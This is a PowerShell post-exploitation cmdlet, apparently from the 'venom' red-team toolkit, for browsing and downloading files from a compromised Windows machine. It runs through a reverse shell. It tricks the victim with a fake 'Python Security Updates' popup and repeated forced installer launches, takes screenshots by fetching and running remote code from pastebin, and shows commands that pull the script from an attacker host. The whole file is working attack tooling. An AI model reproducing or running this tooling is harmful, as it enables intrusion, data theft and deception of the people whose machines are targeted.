<#
.SYNOPSIS
   cmdlet to read/browse/download files from compromised target machine (windows).

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - Build 18363
   Required Dependencies: python (http.server)
   Optional Dependencies: curl|Start-BitsTransfer
   PS cmdlet Dev version: v1.6

.DESCRIPTION
   This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
   with the ability to download files from target machine. It uses social engineering
   to trick target user into installing Python-3.9.0.exe as a python security update
   if the target user does not have python installed. This cmdlet also uses curl native
   binary (LolBin) to download the python windows installer binary from www.python.org
   The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell's

   1º - Place this cmdlet in attacker machine apache2 webroot
        execute: cp webserver.ps1 /var/www/html/webserver.ps1

   2º - Then upload webserver using the reverse tcp shell prompt.
        execute: cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1

   3º - Remote execute webserver.ps1 using the reverse tcp shell prompt
        execute: powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SClose 60

   4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.

.NOTES
   Use 'CTRL+C' to stop the webserver

   cmd /c taskkill /F /IM Python.exe
   Kill remote Python process (stop webserver.ps1)

   If executed without administrator privileges then this cmdlet
   its limmited to directory ACL permissions (R)(W) attributes.
   NOTE: 'Get-Acl' powershell cmdlet displays directory attributes.

.EXAMPLE
   PS C:\> Get-Help .\webserver.ps1 -full
   Access This cmdlet Comment_Based_Help

.EXAMPLE
   PS C:\> .\webserver.ps1
   Spawn webserver in '$Env:UserProfile' directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "C:\Users\pedro\Desktop"
   Spawn webserver in the sellected directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SPort 8111
   Spawn webserver in the sellected directory on port 8111

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SBind 192.168.1.72
   Spawn webserver in the sellected directory and bind to ip addr

.EXAMPLE
   PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
   Capture 5 desktop screenshots with 2 seconds of delay in between
   each capture taken (screenshot), before executing the webserver.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SForce 10 -STime 30
   force remote user to execute the python windows installer
   (10 attempts) and use 30 Sec delay between install attempts.
   'Its the syntax that gives us more guarantees of success'.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SClose 120
   Force webserver to auto-close after 120 seconds

   IF we do NOT set this value then the webserver will run until
   'CTRL+C' its pressed. This stops webserver and reverse tcp shell.
   If -SClose parameter its used then webserver will auto-close after
   a specified number of seconds but our reverse tcp shell stays open.

.INPUTS
   None. You cannot pipe objects into webserver.ps1

.OUTPUTS
   None. This cmdlet does not produce outputs (remotely)
   But if executed Local it will produce terminal displays.

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SPath="$Env:UserProfile",
   [int]$SPort='8086',
   [int]$SRDelay='2',
   [int]$SClose='60',
   [int]$STime='16',
   [int]$SForce='0',
   [int]$SRec='0',
   [string]$SBind
)

$HiddeMsgBox = $False
$CmdletVersion = "v1.6"
$Initial_Path = (pwd).Path
$Server_hostName = (hostname)
$Server_Working_Dir = "$SPath"
$Remote_Server_Port = "$Sport"
$IsArch64 = [Environment]::Is64BitOperatingSystem
If($IsArch64 -eq $True){
   $BinName = "python-3.9.0-amd64.exe"
}Else{
   $BinName = "python-3.9.0.exe"
}

## Simple HTTP WebServer Banner
$host.UI.RawUI.WindowTitle = "@webserver $CmdletVersion {SSA@RedTeam}"
$Banner = @"
░░     ░░ ░░░░░░░ ░░░░░░  ░░░░░░░ ░░░░░░░ ░░░░░░  ░░    ░░ ░░░░░░░ ░░░░░░  
▒▒     ▒▒ ▒▒      ▒▒   ▒▒ ▒▒      ▒▒      ▒▒   ▒▒ ▒▒    ▒▒ ▒▒      ▒▒   ▒▒ 
▒▒  ▒  ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒    ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  
▓▓ ▓▓▓ ▓▓ ▓▓      ▓▓   ▓▓      ▓▓ ▓▓      ▓▓   ▓▓  ▓▓  ▓▓  ▓▓      ▓▓   ▓▓ 
 ███ ███  ███████ ██████  ███████ ███████ ██   ██   ████   ███████ ██   ██ $CmdletVersion
         Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA@RedTeam}

"@;
Clear-Host;
Write-Host $Banner;

If($SRec -gt 0){
$Limmit = $SRec+1 # The number of screenshots to be taken
$Server_Working_Dir = "$Env:TMP" # webserver working directory (for screenshots)
If($SRDelay -lt '1'){$SRDelay = '1'} # Screenshots delay time minimum value accepted

   <#
   .SYNOPSIS
      Capture remote desktop screenshot(s)

   .DESCRIPTION
      [<-SRec>] Parameter allow us to take desktop screenshots before
      continue with webserver execution. The value set in [<-SRec>] parameter
      serve to count how many screenshots we want to capture before continue.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
      Capture 5 desktop screenshots with 2 seconds of delay in between
      each capture taken (screenshot), before executing the webserver.
   #>

   ## Loop Function to take more than one screenshot.
   For ($num = 1 ; $num -le $SRec ; $num++){
      write-host "Screenshot nº: $num" -ForeGroundColor DarkYellow;
      iex(iwr("https://pastebin.com/raw/L8BVTDV6")); # Script.ps1 (pastebin) FileLess execution ..
      Start-Sleep -Seconds $SRDelay; # 2 seconds delay between screenshots (default value)
   }
}

If($SClose -gt 0){
$ClosingTime = "$SClose"+"000"

   <#
   .SYNOPSIS
      parameter: -SClose 60
      Force webserver to auto-close after 'xx' seconds
      Author: @r00t-3xp10it (SSA RedTeam @2020)

   .DESCRIPTION
      [<-SClose>] Parameter allow us to kill the python process
      after a specified number of seconds. Because i cant 'CTRL+C'
      inside reverse tcp shell without closing my connection also.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SClose 60
      Force webserver to auto-close after 60 seconds ..
   #>

   ## Default should be 60.000 = 60 seconds = 1 minut
   # File: ForceClose.vbs will be created and exec before exec the server
   echo "WScript.Sleep($ClosingTime)" > $Env:TMP\ForceClose.vbs
   echo "CreateObject(`"WScript.Shell`").Exec `"cmd /c taskkill /F /IM Python.exe`"" >> $Env:TMP\ForceClose.vbs
   echo "CreateObject(`"WScript.Shell`").Exec `"cmd /c del /F /Q %tmp%\ForceClose.vbs`"" >> $Env:TMP\ForceClose.vbs
   write-host "WebServer active for: $SClose seconds." -ForeGroundColor Green;Start-Sleep -Seconds 1
}

$PythonVersion = cmd /c python --version
If(-not($PythonVersion) -or $PythonVersion -eq $null){
   write-host "Python not found => Downloading from python.org .." -ForeGroundColor DarkRed -BackgroundColor Cyan
   Start-Sleep -Seconds 1

   <#
   .SYNOPSIS
      Download/Install Python 3.9.0 => http.server (requirement)
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      Checks target system architecture (x64 or x86) to download from Python
      oficial webpage the comrrespondent python 3.9.0 windows installer if
      target system does not have the python http.server module installed ..

   .NOTES
      This function uses the native (windows 10) curl.exe LolBin to
      download python-3.9.0.exe before remote execute the installer
   #>

   If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
      ## Download python windows installer and use social engineering to trick user to install it
      write-host "Downloading $BinName from python.org" -ForeGroundColor Green
      cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
      Write-Host "Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green
      powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+64)|Out-Null
      $HiddeMsgBox = $True
      If(Test-Path "$Env:TMP\$BinName"){
         ## Execute python windows installer (Default = just one time)
         powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
      }Else{
         $SForce = '1'
         ## Remote File: $Env:TMP\python-3.9.0.exe not found ..
         # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
         Write-Host "[File] $Env:TMP\$BinName => not found" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
         Write-Host "[Auto] Activate: -SForce 1 parameter to use powershell Start-BitsTransfer" -ForeGroundColor DarkYellow;Start-Sleep -Seconds 2
      }
   }Else{
      $SForce = '1'
      ## LolBin downloader (curl) not found in current system.
      # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
      Write-Host "[Appl] Curl downloder (LolBin) => not found" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
      Write-Host "[Auto] Activate: -SForce 1 parameter to use powershell Start-BitsTransfer" -ForeGroundColor DarkYellow;Start-Sleep -Seconds 2
   }
}

If($SForce -gt 0){
$i = 0 ## Loop counter
$Success = $False ## Python installation status

   <#
   .SYNOPSIS
      parameter: -SForce 2 -STime 16
      force remote user to execute the python windows installer
      (2 attempts) and use 20 Seconds between install attempts.
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      This parameter forces the installation of python-3.9.0.exe
      by looping between python-3.9.0.exe executions until python
      its installed OR the number of attempts set by user in -SForce
      parameter its reached. Example of how to to force the install
      of python in remote host 3 times: .\webserver.ps1 -SForce 3

   .NOTES
      'Its the syntax that gives us more guarantees of success'.
      This function uses powershell Start-BitsTransfer cmdlet to
      download python-3.9.0.exe before remote execute the installer
   #>

   ## Loop Function (Social Engineering)
   # Hint: $i++ increases the nº of the $i counter
   Do {
       $check = cmd /c python --version
       ## check target host python version
       If(-not($check) -or $check -eq $null){
           $i++;Write-Host "[$i] Python Installation => not found" -ForeGroundColor DarkRed -BackgroundColor Cyan
           ## Test if installler exists on remote directory
           If(Test-Path "$Env:TMP\$BinName"){
              Write-Host "[$i] python windows installer => found" -ForeGroundColor Green;Start-Sleep -Seconds 1
              If($HiddeMsgBox -eq $False){
                  Write-Host "[$i] Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green;Start-Sleep -Seconds 1
                  powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+64)|Out-Null;
                  $HiddeMsgBox = $True
              }
              ## Execute python windows installer
              powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
              Start-Sleep -Seconds $STime # 16+4 = 20 seconds between executions (default value)
           }Else{
              ## python windows installer not found, download it ..
              Write-Host "[$i] python windows installer => not found" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
              Write-Host "[$i] Downloading => $Env:TMP\$BinName" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 2
              powershell -w 1 Start-BitsTransfer -Priority foreground -Source https://www.python.org/ftp/python/3.9.0/$BinName -Destination $Env:TMP\$BinName
              ## Execute python windows installer
              powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
           }
        ## Python Successfull Installed ..
        # Mark $Success variable to $True to break SE loop
        }Else{
           $i++;Write-Host "[$i] Python Installation => found" -ForeGroundColor Green
           Start-Sleep -Seconds 2;$Success = $True
        }
   }
   ## DO Loop UNTIL $i (Loop set by user or default value counter) reaches the
   # number input on parameter -SForce OR: if python is $success=$True (found).
   Until($i -eq $SForce -or $Success -eq $True)
}


$Installation = cmd /c python --version
## Make Sure python http.server requirement its satisfied.
If(-not($Installation) -or $Installation -eq $null){
   write-host "[Abort] This cmdlet cant find => Python installation .." -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
   write-host "[Force] the install of python by remote user: .\webserver.ps1 -SForce 15 -STime 26" -ForeGroundColor DarkYellow;Start-Sleep -Seconds 2
   exit
}Else{
   write-host "All Python requirements are satisfied." -ForeGroundColor Green
   Start-Sleep -Seconds 1
   If(-not($SBind) -or $SBind -eq $null){
      ## Grab remote target IPv4 ip address (to --bind)
      $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
   }Else{
      ## Use the cmdlet -SBind parameter (to --bind)
      $Remote_Host = "$SBind"
   }

   ## Auto-Close webserver (python proc)
   cmd /c start /b %tmp%\ForceClose.vbs
   ## Start python http server on sellect Ip/Path/Port
   write-host "Serving HTTP webserver on '$Server_Working_Dir'" -ForeGroundColor Green;Start-Sleep -Seconds 1
   echo "Executing: python -m http.server --directory $Server_Working_Dir --bind $Remote_Host $Remote_Server_Port -SForce $SForce -STime $STime" > $Env:TMP\Server.log
   cmd /c python -m http.server --directory $Server_Working_Dir --bind $Remote_Host $Remote_Server_Port
}
## Final Notes:
# The 'cmd /c' syscall its used in certain ocasions in this cmdlet only because
# it produces less error outputs in terminal prompt compared with PowerShell.
exit
